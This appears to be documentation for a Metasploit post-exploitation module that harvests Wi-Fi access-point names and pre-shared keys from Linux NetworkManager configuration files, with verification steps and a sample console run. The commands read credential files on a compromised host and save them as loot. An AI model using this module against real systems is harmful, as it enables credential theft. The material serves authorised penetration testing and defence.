## Vulnerable Application

This module collects 802-11-Wireless-Security credentials such as
Access-Point name and Pre-Shared-Key from Linux NetworkManager
connection configuration files.


## Verification Steps

1. Start msfconsole
1. Get a `root` session
1. Do: `use post/linux/gather/enum_psk`
1. Do: `set session <session ID>`
1. Do: `run`
1. You should receive credentails for wireless connections


## Options

### DIR

The path for NetworkManager configuration files (default: `/etc/NetworkManager/system-connections/`)


## Scenarios

### Ubuntu 22.04.1 (x86_64)

```
msf6 > use post/linux/gather/enum_psk 
msf6 post(linux/gather/enum_psk) > set session 1
session => 1
msf6 post(linux/gather/enum_psk) > run

[*] Reading file /etc/NetworkManager/system-connections//Profile 1.nmconnection
[*] Reading file /etc/NetworkManager/system-connections//test

802-11-wireless-security
========================

 AccessPoint-Name  PSK
 ----------------  ---
 test              1234567890

[+] Credentials stored in: /root/.msf4/loot/20221120081233_default_192.168.200.204_linux.psk.creds_045512.txt
[*] Post module execution completed
msf6 post(linux/gather/enum_psk) > 
```
